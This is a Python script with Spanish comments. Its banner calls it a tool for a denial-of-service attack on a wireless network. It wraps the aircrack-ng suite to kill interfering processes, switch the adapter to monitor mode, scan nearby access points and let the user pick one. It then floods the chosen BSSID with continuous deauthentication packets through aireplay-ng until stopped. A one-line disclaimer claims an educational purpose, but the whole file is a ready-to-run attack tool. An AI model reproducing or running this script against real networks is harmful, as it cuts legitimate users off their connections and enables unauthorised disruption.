#!/usr/bin/env python3
# Descargo de responsabilidad: este script es solo para fines educativos. No lo use contra ninguna red que no sea de su propiedad o que no tenga autorización para probar.

# Usaremos el módulo de subproceso para ejecutar comandos en Kali Linux.
import subprocess
# Requeriremos expresiones regulares.
import re
# Queremos abrir los archivos CSV generados por airmon-ng y usaremos el módulo csv integrado.
import csv
# Queremos importar os porque queremos verificar sudo
import os
# Queremos usar time.sleep()
import time
# Queremos mover archivos .csv en la carpeta si encontramos alguno. Usaremos shutil para eso.
import shutil
# Crear una marca de tiempo para el nombre de archivo .csv
from datetime import datetime

# Declaramos una lista vacía donde se guardarán todas las redes inalámbricas activas.
active_wireless_networks = []

# Usamos esta función para probar si el ESSID ya está en el archivo de lista.
# Si es así, devolvemos False para que no lo agreguemos de nuevo.
# Si no está en el lst, devolvemos True, lo que instruirá al elif
# sentencia para agregarla a la lst.
def check_for_essid(essid, lst):
    check_status = True

    # Si no hay ESSID en la lista, agregue la fila
    if len(lst) == 0:
        return check_status

    # Esto solo se ejecutará si hay puntos de acceso inalámbrico en la lista.
    for item in lst:
        # Si es verdadero, no agregue a la lista. Falso lo agregará a la lista
        if essid in item["ESSID"]:
            check_status = False

    return check_status


print(r""".
............(\_/)
...........( '_').....................................☻...HELP!!!!
...../"""""""""""""\======¦¦¦¦D -------------------- /▇\
/""""""""""""""""""""""""\.......................... | |
\_@_@_@_@_@_@_@_@_@_@_@_@/
      """)
print("\n****************************************************************")
print("\n*          Herramienta para realizar un DoS                    *")
print("\n*                a un red inalámbrica                          *")
print("\n****************************************************************")


# Si el usuario no ejecuta el programa con privilegios de superusuario, no permita que continúe.
if not 'SUDO_UID' in os.environ.keys():
    print("Prueba con privilegios de administrador.")
    exit()

# Mueva todos los archivos .csv del directorio a una carpeta de respaldo.
for file_name in os.listdir():
    # Solo deberíamos tener un archivo csv ya que los borramos de la carpeta cada vez que ejecutamos el programa.
    if ".csv" in file_name:
        print("No debería haber ningún archivo .csv en su directorio. Encontramos archivos .csv en su directorio.")
        # Obtenemos el directorio de trabajo actual.
        directory = os.getcwd()
        try:
            # Creamos un nuevo directorio llamado /backup
            os.mkdir(directory + "/backup/")
        except:
            print("Carpeta Backup existe.")
        # Crear una marca de tiempo
        timestamp = datetime.now()
        # Copiamos cualquier archivo .csv en la carpeta a la carpeta de respaldo.
        shutil.move(file_name, directory + "/backup/" + str(timestamp) + "-" + file_name)

# Regex para encontrar interfaces inalámbricas, asumimos que todas serán wlan0 o superiores.
wlan_pattern = re.compile("^wlan[0-9]+")

# Python nos permite ejecutar comandos del sistema usando una función provista por el módulo de subproceso.
# subprocess.run(<aquí va la lista de argumentos de la línea de comandos>, <especifique si desea que la salida de captura sea verdadera>)
# Queremos capturar la salida. La salida estará en UTF-8 estándar y la decodificará.
# El script es el proceso principal y crea un proceso secundario que ejecuta el comando del sistema y solo continuará una vez que el proceso secundario se haya completado.
# Ejecutamos el comando iwconfig para buscar interfaces inalámbricas.
check_wifi_result = wlan_pattern.findall(subprocess.run(["iwconfig"], capture_output=True).stdout.decode())

# No hay adaptador WiFi conectado.
if len(check_wifi_result) == 0:
    print("Conecta un controlador WiFi e inténtalo de nuevo.")
    exit()

# Menú para seleccionar la interfaz WiFi desde
print("Las siguientes interfaces WiFi están disponibles:")
for index, item in enumerate(check_wifi_result):
    print(f"{index} - {item}")

# Asegúrese de que la interfaz WiFi seleccionada sea válida. Menú simple con interfaces para seleccionar.
while True:
    wifi_interface_choice = input("Seleccione la interfaz que desea utilizar para el ataque:")
    try:
        if check_wifi_result[int(wifi_interface_choice)]:
            break
    except:
        print("Ingrese un número que corresponda con las opciones.")

# Para facilitar la referencia, llamamos hacknic a la interfaz seleccionada
hacknic = check_wifi_result[int(wifi_interface_choice)]

# Mata los procesos WiFi conflictivos
print("¡Adaptador WiFi conectado!\nAhora eliminemos los procesos en conflicto:")

# subprocess.run(<la lista de argumentos de la línea de comando va aquí>)
# El script es el proceso principal y crea un proceso secundario que ejecuta el comando del sistema y solo continuará una vez que el proceso secundario se haya completado.
# Ejecutamos el comando iwconfig para buscar interfaces inalámbricas.
# Matar todos los procesos en conflicto usando airmon-ng
kill_confilict_processes =  subprocess.run(["sudo", "airmon-ng", "check", "kill"])

# Poner inalámbrica en modo monitoreado
print("Poner el adaptador Wifi en modo monitoreado:")
put_in_monitored_mode = subprocess.run(["sudo", "airmon-ng", "start", hacknic])

# subprocess.Popen(<la lista de argumentos de la línea de comandos va aquí>)
# El método Popen abre una tubería desde un comando. La salida es un archivo abierto al que pueden acceder otros programas.
# Ejecutamos el comando iwconfig para buscar interfaces inalámbricas.
# Descubre puntos de acceso
discover_access_points = subprocess.Popen(["sudo", "airodump-ng","-w" ,"file","--write-interval", "1","--output-format", "csv", hacknic + "mon"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

# Bucle que muestra los puntos de acceso inalámbrico. Usamos un bloque try except y saldremos del ciclo presionando ctrl-c.
try:
    while True:
        # Queremos borrar la pantalla antes de imprimir las interfaces de red.
        subprocess.call("clear", shell=True)
        for file_name in os.listdir():
                # Solo deberíamos tener un archivo csv ya que hacemos una copia de seguridad de todos los archivos csv anteriores de la carpeta cada vez que ejecutamos el programa.
                # La siguiente lista contiene los nombres de campo para las entradas csv.
                fieldnames = ['BSSID', 'First_time_seen', 'Last_time_seen', 'channel', 'Speed', 'Privacy', 'Cipher', 'Authentication', 'Power', 'beacons', 'IV', 'LAN_IP', 'ID_length', 'ESSID', 'Key']
                if ".csv" in file_name:
                    with open(file_name) as csv_h:
                        # Usamos el método DictReader y le decimos que tome el contenido de csv_h y luego aplique el diccionario con los nombres de campo que especificamos anteriormente.
                         # Esto crea una lista de diccionarios con las claves especificadas en los nombres de campo.
                        csv_h.seek(0)
                        csv_reader = csv.DictReader(csv_h, fieldnames=fieldnames)
                        for row in csv_reader:
                            if row["BSSID"] == "BSSID":
                                pass
                            elif row["BSSID"] == "Station MAC":
                                break
                            elif check_for_essid(row["ESSID"], active_wireless_networks):
                                active_wireless_networks.append(row)

        print("Scanning. Presione Ctrl+C cuando desee seleccionar qué red inalámbrica desea atacar.\n")
        print("No |\tBSSID              |\tChannel|\tESSID                         |")
        print("___|\t___________________|\t_______|\t______________________________|")
        for index, item in enumerate(active_wireless_networks):
            # Estamos usando la declaración de impresión con una cadena f.
             # Las cadenas F son una forma más intuitiva de incluir variables al imprimir cadenas,
             # en lugar de feas concatenaciones.
            print(f"{index}\t{item['BSSID']}\t{item['channel'].strip()}\t\t{item['ESSID']}")
        # Hacemos que el script duerma durante 1 segundo antes de cargar la lista actualizada.
        time.sleep(1)

except KeyboardInterrupt:
    print("\nListo para hacer la elección.")

# Asegúrese de que la opción de entrada sea válida.
while True:
    choice = input("Seleccione una opción de arriba:")
    try:
        if active_wireless_networks[int(choice)]:
            break
    except:
        print("Inténtalo de nuevo.")

# Para facilitar el trabajo, asignamos los resultados a las variables.
hackbssid = active_wireless_networks[int(choice)]["BSSID"]
hackchannel = active_wireless_networks[int(choice)]["channel"].strip()

# Cambiar al canal en el que queremos realizar el ataque DOS.
# El monitoreo se lleva a cabo en un canal diferente y debemos configurarlo en ese canal. 
subprocess.run(["airmon-ng", "start", hacknic + "mon", hackchannel])

# Desautenticar clientes. Lo ejecutamos con Popen y enviamos la salida a subprocess.DEVNULL y los errores a subprocess.DEVNULL. Por lo tanto, ejecutaremos deauthenticate en segundo plano.
subprocess.Popen(["aireplay-ng", "--deauth", "0", "-a", hackbssid, check_wifi_result[int(wifi_interface_choice)] + "mon"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) 

# Ejecutamos un bucle infinito que puede salir presionando ctrl-c. La desautenticación se detendrá cuando detengamos el script.
try:
    while True:
        print("Desautenticando clientes, presione ctrl-c para detener")
except KeyboardInterrupt:
    print("Detener el modo de monitoreo")
    # Ejecutamos un comando subprocess.run donde detenemos el modo de monitoreo en el adaptador de red.
    subprocess.run(["airmon-ng", "stop", hacknic + "mon"])
    print("¡Gracias! saliendo ahora")
